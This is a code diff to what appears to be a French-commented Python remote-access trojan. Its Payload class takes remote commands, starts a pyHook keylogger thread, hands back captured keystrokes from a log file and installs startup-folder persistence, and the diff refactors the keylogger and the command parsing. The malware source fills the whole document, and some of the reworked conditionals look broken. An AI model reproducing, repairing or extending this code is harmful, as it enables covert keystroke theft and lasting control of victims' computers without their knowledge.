@@ -34,12 +34,9 @@ class Threads:
     thread_id = 0
     thread_name = "null"
 
-    def __init__(self):
-        print("Initialisation ")
-
     def StartThread(self, fonction, arg1 = ""):
         if "Keylogger" in fonction:
-            thread = threading.Thread(target=Keylogger().Keylogger, name=fonction)
+            thread = threading.Thread(target=keylog.Keylog, name=fonction)
             thread.start()
         if "Commande" in fonction:
             thread = threading.Thread(target=payload.Commande, name=fonction, args=arg1)
@@ -102,59 +99,67 @@ class Payload:
             print(command)
             #output = subprocess.getoutput(command)
             #ClientSocket.send(str.encode(output))
-            if splited_command[0].lower() == "keylogger":
+            if command.lower() != "keylogger":
 
-                if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
-                    ## run le keylogger
-                    if self.keylogger_mode == "null":
-                        self.keylogger_mode = "run"
-                        output = "Keylogger Activé"
-                        ## lance un thread de keylog
-                        thread_keylog = Threads()
-                        thread_keylog.StartThread("Keylogger")
-                    elif self.keylogger_mode == "stop":
-                        self.keylogger_mode = "run"
-                        output = "Keylogger Activé"
-                elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
-                    output = "Keylogger déja Activé"
+                if splited_command[0].lower() == "keylogger":
 
-                elif splited_command[1].lower() == "status":
-                    ## envoyer retour du keylogger
-                    #self.keylogger_mode = "status"
-                    file = open("keylogs.txt", 'r')
-                    logs = file.read()
-                    file.close()
-                    output = logs
+                    if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
+                        ## run le keylogger
+                        if self.keylogger_mode == "null":
+                            self.keylogger_mode = "run"
+                            output = "Keylogger Activé"
+                            ## lance un thread de keylog
+                            thread_keylog = Threads()
+                            thread_keylog.StartThread("Keylogger")
+                        elif self.keylogger_mode == "stop":
+                            self.keylogger_mode = "run"
+                            output = "Keylogger Activé"
+                    elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
+                        output = "Keylogger déja Activé"
 
-                elif splited_command[1].lower() == "stop":
-                    ## run le keylogger
-                    self.keylogger_mode = "stop"
-                    #thread_keylog.StopThread()
-                    output = "Keylogger Desactivé"
+                    elif splited_command[1].lower() == "status":
+                        ## envoyer retour du keylogger
+                        #self.keylogger_mode = "status"
+                        file = open("keylogs.txt", 'r')
+                        logs = file.read()
+                        file.close()
+                        output = logs
+
+                    elif splited_command[1].lower() == "stop":
+                        ## run le keylogger
+                        self.keylogger_mode = "stop"
+                        #thread_keylog.StopThread()
+                        output = "Keylogger Desactivé"
             
-            if splited_command[0].lower() == "persistance":
+            else:
+                output = "Keylogger a besoin d'une option"
+            
+            if command.lower() != "persistance":
 
-                if splited_command[1].lower() == "auto":
-                    print("Persistance automatique")
-                    output = "Persistance automatique"
+                if splited_command[0].lower() == "persistance":
 
-                elif splited_command[1].lower() == "startup":
-                    result, code = pers._add_startup_file()
-                    if result == False and code == "deja mise":
-                        print("Persistance via dossier startup déja activé")
-                        output = "Persistance via dossier startup déja activé"
-                    if result == False and code == "error":
-                        print("Persistance via dossier startup a rencontrer une erreur")
-                        output = "Persistance via dossier startup a rencontrer une erreur"
-                    if result == True:
-                        print("Persistance via dossier startup activé")
-                        output = "Persistance via dossier startup activé"
-                    
-                    
+                    if splited_command[1].lower() == "auto":
+                        print("Persistance automatique")
+                        output = "Persistance automatique"
 
-                elif splited_command[1].lower() == "powershell":
-                    print("Persistance via powershell")
-                    output = "Persistance via powershell"
+                    elif splited_command[1].lower() == "startup":
+                        result, code = pers._add_startup_file()
+                        if result == False and code == "deja mise":
+                            print("Persistance via dossier startup déja activé")
+                            output = "Persistance via dossier startup déja activé"
+                        if result == False and code == "error":
+                            print("Persistance via dossier startup a rencontrer une erreur")
+                            output = "Persistance via dossier startup a rencontrer une erreur"
+                        if result == True:
+                            print("Persistance via dossier startup activé")
+                            output = "Persistance via dossier startup activé"
+
+                    elif splited_command[1].lower() == "powershell":
+                        print("Persistance via powershell")
+                        output = "Persistance via powershell"
+
+            else:
+                output = "Persistance a besoin d'une option"
             
             if command.lower() == "exit":
                 # if the command is exit, just break out of the loop
@@ -226,9 +231,7 @@ class Keylogger:
     psapi = windll.psapi
     current_window = None
 
-
-
-    def Keylogger(self):
+    def Keylog(self):
             
         #create and register a hook manager
         k1 = pyHook.HookManager()
@@ -445,4 +448,5 @@ class Info:
 
 
 payload = Payload()
+keylog = Keylogger()
 payload.run()
